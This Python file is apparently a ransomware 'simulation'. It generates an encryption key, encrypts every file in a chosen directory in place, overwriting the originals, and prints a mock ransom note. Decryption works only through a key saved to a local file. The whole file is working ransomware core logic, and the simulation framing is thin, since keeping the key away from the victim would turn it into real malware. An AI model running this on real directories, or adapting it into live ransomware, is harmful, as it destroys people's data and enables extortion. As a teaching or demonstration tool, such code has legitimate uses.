import os
import logging
from cryptography.fernet import Fernet

logger = logging.getLogger(__name__)

def generate_key():
    """Generates a new encryption key and saves it to a file."""
    key = Fernet.generate_key()
    with open("ransomware_key.key", "wb") as key_file:
        key_file.write(key)
    logger.info("New encryption key generated and saved to 'ransomware_key.key'")
    return key

def load_key():
    """Loads the encryption key from the key file."""
    try:
        with open("ransomware_key.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        logger.warning("No key file found. A new one will be generated for encryption.")
        return None

def encrypt_directory(directory_path, key):
    """Encrypts all files in a specified directory, skipping subdirectories."""
    fernet = Fernet(key)
    logger.warning(f"Starting encryption simulation on directory: {directory_path}")
    logger.warning("THIS IS A SIMULATION. Files will be encrypted, but the key is saved locally.")

    for filename in os.listdir(directory_path):
        filepath = os.path.join(directory_path, filename)
        if os.path.isfile(filepath):
            try:
                with open(filepath, "rb") as file:
                    original = file.read()

                encrypted = fernet.encrypt(original)

                with open(filepath, "wb") as encrypted_file:
                    encrypted_file.write(encrypted)

                logger.info(f"Encrypted {filepath}")
            except Exception as e:
                logger.error(f"Failed to encrypt {filepath}: {e}")

def decrypt_directory(directory_path, key):
    """Decrypts all files in a specified directory."""
    fernet = Fernet(key)
    logger.info(f"Starting decryption for directory: {directory_path}")

    for filename in os.listdir(directory_path):
        filepath = os.path.join(directory_path, filename)
        if os.path.isfile(filepath):
            try:
                with open(filepath, "rb") as encrypted_file:
                    encrypted = encrypted_file.read()

                decrypted = fernet.decrypt(encrypted)

                with open(filepath, "wb") as decrypted_file:
                    decrypted_file.write(decrypted)

                logger.info(f"Decrypted {filepath}")
            except Exception as e:
                logger.error(f"Failed to decrypt {filepath}: {e}")

def run_simulation(args):
    """Runs the full ransomware simulation or decryption."""
    if not args:
        print("Usage: ransom <encrypt|decrypt> <directory_path>")
        return

    action = args[0]
    directory = args[1]

    if not os.path.isdir(directory):
        logger.error(f"Error: Directory '{directory}' not found.")
        return

    if action == "encrypt":
        key = generate_key()
        encrypt_directory(directory, key)
        print("\n--- RANSOM NOTE ---")
        print(f"Your files in '{directory}' have been encrypted.")
        print("To decrypt them, use the command: ransom decrypt <directory_path>")
        print("In a real attack, the key would be held by the attacker.")
        print("--- END NOTE ---\n")
    elif action == "decrypt":
        key = load_key()
        if not key:
            logger.error("Decryption failed: 'ransomware_key.key' not found.")
            return
        decrypt_directory(directory, key)
    else:
        print(f"Unknown action: {action}. Use 'encrypt' or 'decrypt'.")
